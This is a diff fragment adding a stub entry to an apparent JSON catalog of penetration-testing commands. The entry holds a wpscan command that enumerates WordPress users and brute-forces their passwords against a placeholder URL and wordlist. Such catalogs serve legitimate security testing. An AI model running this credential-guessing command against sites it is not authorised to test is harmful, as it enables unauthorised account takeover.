+      "name": "Wpscan"
+    },
+    {
+      "id": "wpscan-list",
+      "command": "wpscan --url <URL> --enumerate u --passwords <WORDLIST> (uses xmlrpc if available)",
+      "category": "enumeration",
+      "tags": [
+        "enumeration",
+        "wpscan",
+        "auto-generated"
+      ],
+      "description": "Auto-generated stub for wpscan",
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target URL",
+          "example": "",
+          "required": true
+        },
+        {
+          "name": "<WORDLIST>",
+          "description": "Path to wordlist file",
+          "example": "",
+          "required": true
+        }
+      ],
+      "output_analysis": [
+        "Review wpscan output for relevant information"
+      ],
+      "common_uses": [
+        "Alternative to wordpress-xmlrpc-enum"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "next_steps": [],
+      "notes": "AUTO-GENERATED STUB - Needs manual enrichment. Referenced in data/commands/web/wordpress.json",
+      "name": "Wpscan List"
+    }
+  ]
+}
